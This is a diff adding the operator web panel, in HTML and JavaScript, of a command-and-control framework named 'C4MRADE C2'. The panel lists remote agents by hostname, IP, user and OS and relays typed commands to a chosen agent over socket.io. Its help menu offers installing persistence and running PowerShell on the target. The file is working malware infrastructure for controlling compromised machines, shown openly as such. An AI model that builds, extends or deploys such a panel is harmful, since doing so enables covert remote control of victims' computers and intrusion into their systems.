@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C4MRADE C2 Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=JetBrains+Mono:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    
+    <style>
+        :root {
+            --neon-cyan: #00fff7;
+            --neon-blue: #00d4ff;
+            --neon-purple: #bd00ff;
+            --neon-pink: #ff006e;
+            --neon-green: #39ff14;
+            --bg-dark: #050510;
+            --bg-panel: rgba(8, 12, 25, 0.92);
+            --border-cyan: rgba(0, 255, 247, 0.4);
+            --glow-cyan: 0 0 20px rgba(0, 255, 247, 0.6);
+            --glow-purple: 0 0 20px rgba(189, 0, 255, 0.6);
+            --font-cyber: 'Orbitron', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: radial-gradient(ellipse at center, #0a0e1e 0%, var(--bg-dark) 100%);
+            color: var(--neon-cyan);
+            font-family: var(--font-mono);
+            height: 100vh;
+            overflow: hidden;
+            cursor: default;
+        }
+
+        /* Animated Grid Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 247, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 247, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 0;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+
+        /* Scanlines Effect */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 247, 0.02) 0px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 999;
+            opacity: 0.5;
+        }
+
+        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.15; }
+        #matrix-fx { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.25; }
+
+        header {
+            background: linear-gradient(135deg, rgba(0, 255, 247, 0.08), rgba(189, 0, 255, 0.08));
+            backdrop-filter: blur(15px);
+            border-bottom: 2px solid var(--border-cyan);
+            padding: 18px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: var(--glow-cyan);
+            position: relative;
+            z-index: 100;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .brand-icon {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #000;
+            box-shadow: var(--glow-cyan);
+        }
+
+        .brand-text h1 {
+            font-family: var(--font-cyber);
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 4px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 255, 247, 0.5);
+        }
+
+        .brand-text p {
+            font-size: 10px;
+            letter-spacing: 3px;
+            color: var(--neon-blue);
+            text-transform: uppercase;
+            margin-top: 2px;
+        }
+
+        .system-stats {
+            display: flex;
+            gap: 40px;
+            font-family: var(--font-cyber);
+            font-size: 11px;
+        }
+
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+        }
+
+        .stat-label {
+            color: var(--neon-purple);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .stat-value {
+            color: var(--neon-cyan);
+            font-size: 16px;
+            font-weight: bold;
+            text-shadow: var(--glow-cyan);
+        }
+
+        .workspace {
+            display: grid;
+            grid-template-columns: 320px 1fr 320px;
+            gap: 18px;
+            padding: 18px;
+            height: calc(100vh - 120px);
+            position: relative;
+            z-index: 1;
+        }
+
+        .panel {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-cyan);
+            border-radius: 12px;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .panel:hover {
+            border-color: var(--neon-cyan);
+            box-shadow: var(--glow-cyan), 0 8px 40px rgba(0, 0, 0, 0.8);
+        }
+
+        .panel-header {
+            background: linear-gradient(135deg, rgba(0, 255, 247, 0.1), rgba(189, 0, 255, 0.05));
+            padding: 14px 18px;
+            border-bottom: 1px solid var(--border-cyan);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .panel-title {
+            font-family: var(--font-cyber);
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+        }
+
+        .panel-icon {
+            color: var(--neon-purple);
+            font-size: 14px;
+        }
+
+        /* Agent List */
+        .agent-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 12px;
+        }
+
+        .agent-card {
+            background: rgba(0, 255, 247, 0.03);
+            border: 1px solid rgba(0, 255, 247, 0.15);
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .agent-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 247, 0.1), transparent);
+            transition: 0.5s;
+        }
+
+        .agent-card:hover::before {
+            left: 100%;
+        }
+
+        .agent-card:hover {
+            background: rgba(0, 255, 247, 0.08);
+            border-color: var(--neon-cyan);
+            transform: translateX(6px);
+            box-shadow: 0 4px 20px rgba(0, 255, 247, 0.3);
+        }
+
+        .agent-card.active {
+            background: linear-gradient(135deg, rgba(0, 255, 247, 0.15), rgba(189, 0, 255, 0.1));
+            border-color: var(--neon-cyan);
+            box-shadow: var(--glow-cyan);
+        }
+
+        .agent-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .agent-status {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--neon-green);
+            box-shadow: 0 0 10px var(--neon-green);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(0.9); }
+        }
+
+        .agent-status.offline {
+            background: var(--neon-pink);
+            box-shadow: 0 0 10px var(--neon-pink);
+            animation: none;
+        }
+
+        .agent-hostname {
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .agent-details {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+            line-height: 1.6;
+        }
+
+        .agent-details b {
+            color: var(--neon-cyan);
+        }
+
+        /* Terminal */
+        .terminal {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            font-size: 13px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .terminal-output::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .terminal-output::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .terminal-output::-webkit-scrollbar-thumb {
+            background: linear-gradient(var(--neon-cyan), var(--neon-purple));
+            border-radius: 10px;
+        }
+
+        .welcome-logo {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10px;
+            line-height: 1.1;
+            color: var(--neon-cyan);
+            text-align: center;
+            margin: 40px 0 30px;
+            text-shadow: var(--glow-cyan);
+        }
+
+        .log-line {
+            margin-bottom: 10px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .log-label {
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .log-system { color: var(--neon-cyan); }
+        .log-auth { color: var(--neon-purple); }
+        .log-status { color: var(--neon-green); }
+        .log-error { color: var(--neon-pink); }
+
+        .cmd-prompt {
+            color: var(--neon-cyan);
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .cmd-text {
+            color: #fff;
+        }
+
+        .cmd-output {
+            background: rgba(0, 255, 247, 0.04);
+            border-left: 3px solid var(--neon-cyan);
+            padding: 12px;
+            margin: 8px 0 8px 20px;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: rgba(255, 255, 255, 0.85);
+        }
+
+        .terminal-input {
+            background: rgba(0, 0, 0, 0.6);
+            border-top: 1px solid var(--border-cyan);
+            padding: 16px 20px;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .prompt-symbol {
+            color: var(--neon-cyan);
+            font-weight: bold;
+            font-family: var(--font-cyber);
+            font-size: 14px;
+        }
+
+        #cmdInput {
+            flex: 1;
+            background: rgba(0, 255, 247, 0.05);
+            border: 1px solid var(--border-cyan);
+            border-radius: 6px;
+            color: #fff;
+            padding: 10px 14px;
+            font-family: var(--font-mono);
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        #cmdInput:focus {
+            background: rgba(0, 255, 247, 0.1);
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 15px rgba(0, 255, 247, 0.3);
+        }
+
+        /* Intel Panel */
+        .intel-container {
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            overflow-y: auto;
+        }
+
+        .intel-card {
+            background: rgba(0, 255, 247, 0.04);
+            border: 1px solid rgba(0, 255, 247, 0.15);
+            border-radius: 8px;
+            padding: 14px;
+        }
+
+        .intel-label {
+            font-family: var(--font-cyber);
+            font-size: 10px;
+            color: var(--neon-purple);
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .intel-value {
+            color: #fff;
+            font-size: 13px;
+            word-break: break-all;
+        }
+
+        .progress-bar {
+            height: 5px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple));
+            border-radius: 10px;
+            width: 0%;
+            transition: width 1s ease;
+            box-shadow: 0 0 10px var(--neon-cyan);
+        }
+
+        /* Footer */
+        footer {
+            background: rgba(0, 0, 0, 0.8);
+            border-top: 1px solid var(--border-cyan);
+            padding: 10px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: var(--font-cyber);
+            font-size: 11px;
+            letter-spacing: 2px;
+            z-index: 100;
+        }
+
+        .footer-text {
+            color: var(--neon-cyan);
+        }
+
+        .footer-highlight {
+            color: var(--neon-purple);
+            font-weight: bold;
+        }
+
+        .loading-dots::after {
+            content: '.';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60% { content: '...'; }
+            80%, 100% { content: ''; }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="bg-canvas"></canvas>
+    <canvas id="matrix-fx"></canvas>
+
+    <header>
+        <div class="brand">
+            <div class="brand-icon">
+                <i class="fas fa-terminal"></i>
+            </div>
+            <div class="brand-text">
+                <h1>C4MRADE C2</h1>
+                <p>Advanced Control Framework</p>
+            </div>
+        </div>
+        <div class="system-stats">
+            <div class="stat-item">
+                <div class="stat-label">Uptime</div>
+                <div class="stat-value" id="sys-uptime">00:00:00</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Targets</div>
+                <div class="stat-value" id="sys-targets">0</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Protocol</div>
+                <div class="stat-value">XOR+B64</div>
+            </div>
+        </div>
+    </header>
+
+    <div class="workspace">
+        <!-- Left Panel: Agents -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-title">Active Agents</span>
+                <i class="fas fa-network-wired panel-icon"></i>
+            </div>
+            <div class="agent-list" id="agentList"></div>
+        </div>
+
+        <!-- Center Panel: Terminal -->
+        <div class="panel terminal">
+            <div class="panel-header">
+                <span class="panel-title" id="termTitle">C4MRADE Terminal [v2.5]</span>
+                <i class="fas fa-terminal panel-icon"></i>
+            </div>
+            <div class="terminal-output" id="termOutput">
+                <pre class="welcome-logo">
+   ██████╗ ██████╗ ███╗   ███╗██████╗  █████╗ ██████╗ ███████╗
+  ██╔════╝██╔═████╗████╗ ████║██╔══██╗██╔══██╗██╔══██╗██╔════╝
+  ██║     ██║██╔██║██╔████╔██║██████╔╝███████║██║  ██║█████╗  
+  ██║     ████╔╝██║██║╚██╔╝██║██╔══██╗██╔═��██║██║  ██║██╔══╝  
+  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝███████╗
+   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝
+                </pre>
+                <div class="log-line">
+                    <span class="log-label log-system">[SYSTEM]</span> C4MRADE C2 Framework v2.5 initialized.
+                </div>
+                <div class="log-line">
+                    <span class="log-label log-auth">[AUTH]</span> Logged in as: <b style="color: var(--neon-cyan)">Operator</b>
+                </div>
+                <div class="log-line">
+                    <span class="log-label log-status">[STATUS]</span> Secure tunnel active. Awaiting connections...
+                </div>
+            </div>
+            <div class="terminal-input">
+                <span class="prompt-symbol" id="promptSymbol">C4MRADE:~$</span>
+                <input type="text" id="cmdInput" placeholder=">> ENTER COMMAND" autocomplete="off" autofocus>
+            </div>
+        </div>
+
+        <!-- Right Panel: Intel -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-title">Intel Database</span>
+                <i class="fas fa-database panel-icon"></i>
+            </div>
+            <div class="intel-container">
+                <div class="intel-card">
+                    <div class="intel-label">Selected Node</div>
+                    <div class="intel-value" id="intel-host">OFFLINE</div>
+                </div>
+                <div class="intel-card">
+                    <div class="intel-label">System Load</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="load-bar"></div>
+                    </div>
+                </div>
+                <div class="intel-card">
+                    <div class="intel-label">Geo Location</div>
+                    <div class="intel-value" id="intel-ip">UNKNOWN</div>
+                </div>
+                <div class="intel-card">
+                    <div class="intel-label">Directory</div>
+                    <div class="intel-value" id="intel-cwd" style="font-size: 11px;">/</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-text">C4MRADE OPERATOR: <span class="footer-highlight">SYSTEM</span></div>
+        <div class="footer-text">SECURED END-TO-END</div>
+        <div class="footer-text" id="live-timer">00:00:00</div>
+    </footer>
+
+    <script>
+        const socket = io();
+        let targetId = null;
+        let commandHistory = [];
+        let historyIndex = -1;
+
+        const output = document.getElementById('termOutput');
+        const input = document.getElementById('cmdInput');
+        const promptSymbol = document.getElementById('promptSymbol');
+
+        // Background particles
+        const bgC = document.getElementById('bg-canvas');
+        const bgCtx = bgC.getContext('2d');
+        bgC.width = window.innerWidth;
+        bgC.height = window.innerHeight;
+        let particles = [];
+        for(let i=0; i<80; i++) {
+            particles.push({
+                x: Math.random() * bgC.width,
+                y: Math.random() * bgC.height,
+                r: Math.random() * 2,
+                s: Math.random() * 0.4
+            });
+        }
+        
+        function drawBg() {
+            bgCtx.clearRect(0, 0, bgC.width, bgC.height);
+            bgCtx.fillStyle = '#00fff7';
+            particles.forEach(p => {
+                bgCtx.beginPath();
+                bgCtx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                bgCtx.fill();
+                p.y += p.s;
+                if(p.y > bgC.height) p.y = 0;
+            });
+            requestAnimationFrame(drawBg);
+        }
+        drawBg();
+
+        // Matrix effect
+        const mx = document.getElementById('matrix-fx');
+        const mxCtx = mx.getContext('2d');
+        mx.width = window.innerWidth;
+        mx.height = window.innerHeight;
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        const drops = Array(Math.floor(mx.width / 20)).fill(1);
+        
+        function drawMatrix() {
+            mxCtx.fillStyle = 'rgba(5, 5, 16, 0.08)';
+            mxCtx.fillRect(0, 0, mx.width, mx.height);
+            mxCtx.fillStyle = '#00fff7';
+            mxCtx.font = "14px Share Tech Mono";
+            
+            drops.forEach((y, i) => {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                mxCtx.fillText(text, i * 20, y * 20);
+                
+                if(Math.random() > 0.97) {
+                    mxCtx.fillStyle = '#bd00ff';
+                    mxCtx.fillText(text, i * 20, y * 20);
+                    mxCtx.fillStyle = '#00fff7';
+                }
+                
+                if(y * 20 > mx.height && Math.random() > 0.98) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawMatrix, 35);
+
+        // Update time
+        setInterval(() => {
+            const time = new Date().toLocaleTimeString();
+            document.getElementById('live-timer').innerText = time;
+            document.getElementById('sys-uptime').innerText = time;
+        }, 1000);
+
+        // Socket events
+        socket.on('agent_list', (agents) => {
+            document.getElementById('sys-targets').innerText = agents.filter(a => a.status === 'Active').length;
+            
+            const list = document.getElementById('agentList');
+            list.innerHTML = '';
+            
+            agents.forEach(a => {
+                const card = document.createElement('div');
+                card.className = `agent-card ${a.id === targetId ? 'active' : ''}`;
+                card.onclick = () => selectAgent(a);
+                
+                card.innerHTML = `
+                    <div class="agent-header">
+                        <div class="agent-status ${a.status === 'Active' ? '' : 'offline'}"></div>
+                        <div class="agent-hostname">${a.hostname}</div>
+                    </div>
+                    <div class="agent-details">
+                        <b>IP:</b> ${a.id.split(':')[0]}<br>
+                        <b>User:</b> ${a.username}<br>
+                        <b>OS:</b> ${a.os}
+                    </div>
+                `;
+                list.appendChild(card);
+            });
+            
+            if(targetId) {
+                const node = agents.find(x => x.id === targetId);
+                if(node) updateIntel(node);
+            }
+        });
+
+        function selectAgent(a) {
+            targetId = a.id;
+            updateIntel(a);
+            
+            output.innerHTML = '';
+            addLog('SYSTEM', `Secure channel opened to ${a.hostname}`, 'log-system');
+            addLog('SYSTEM', `Target: ${a.id}`, 'log-system');
+            addLog('STATUS', `Ready for commands. Type 'help' for assistance.`, 'log-status');
+            
+            input.focus();
+            document.getElementById('load-bar').style.width = Math.floor(Math.random() * 70 + 30) + '%';
+        }
+
+        function updateIntel(a) {
+            document.getElementById('intel-host').innerText = a.hostname;
+            document.getElementById('intel-ip').innerText = a.id.split(':')[0];
+            document.getElementById('intel-cwd').innerText = a.cwd;
+            promptSymbol.innerText = `${a.username}@${a.hostname.split(' ')[0]}:${a.cwd}>`;
+        }
+
+        function addLog(label, text, labelClass = 'log-system') {
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            line.innerHTML = `<span class="log-label ${labelClass}">[${label}]</span> ${text}`;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function addCommand(cmd) {
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            line.innerHTML = `<span class="cmd-prompt">${promptSymbol.innerText}</span><span class="cmd-text">${cmd}</span>`;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function addOutput(text) {
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            const box = document.createElement('div');
+            box.className = 'cmd-output';
+            box.innerText = text;
+            line.appendChild(box);
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        input.addEventListener('keydown', (e) => {
+            if(e.key === 'Enter') {
+                const cmd = input.value.trim();
+                if(!cmd) return;
+                
+                if(cmd.toLowerCase() === 'clear') {
+                    output.innerHTML = '';
+                    input.value = '';
+                    return;
+                }
+                
+                if(cmd.toLowerCase() === 'history') {
+                    addLog('SYSTEM', 'Command History:', 'log-system');
+                    commandHistory.forEach((h, i) => {
+                        addLog('HISTORY', `[${commandHistory.length - i}] ${h}`, 'log-system');
+                    });
+                    input.value = '';
+                    return;
+                }
+                
+                if(cmd.toLowerCase() === 'help') {
+                    addLog('SYSTEM', 'C4MRADE v2.5 - Available Commands:', 'log-system');
+                    addOutput('sysinfo    - System information\npersist    - Install persistence\nps [cmd]   - PowerShell execution\ncd [path]  - Change directory\nclear      - Clear terminal\nhistory    - Command history\nexit       - Terminate session');
+                    input.value = '';
+                    return;
+                }
+                
+                if(!targetId) {
+                    addLog('ERROR', 'No target selected', 'log-error');
+                    input.value = '';
+                    return;
+                }
+                
+                commandHistory.unshift(cmd);
+                historyIndex = -1;
+                
+                addCommand(cmd);
+                
+                const loadId = 'load-' + Date.now();
+                const loadLine = document.createElement('div');
+                loadLine.id = loadId;
+                loadLine.className = 'log-line';
+                loadLine.innerHTML = `<span class="log-label log-status">[EXEC]</span> Executing<span class="loading-dots"></span>`;
+                output.appendChild(loadLine);
+                output.scrollTop = output.scrollHeight;
+                
+                socket.emit('execute_command', {
+                    agent_id: targetId,
+                    command: cmd,
+                    callback_id: loadId
+                });
+                
+                input.value = '';
+            } else if(e.key === 'ArrowUp') {
+                e.preventDefault();
+                if(historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    input.value = commandHistory[historyIndex];
+                }
+            } else if(e.key === 'ArrowDown') {
+                e.preventDefault();
+                if(historyIndex > 0) {
+                    historyIndex--;
+                    input.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = -1;
+                    input.value = '';
+                }
+            }
+        });
+
+        socket.on('command_result', (data) => {
+            const loader = document.getElementById(data.callback_id);
+            if(loader) loader.remove();
+            
+            if(data.agent_id !== targetId) return;
+            addOutput(data.result || data.error);
+        });
+
+        document.body.onclick = () => input.focus();
+    </script>
+</body>
+</html>
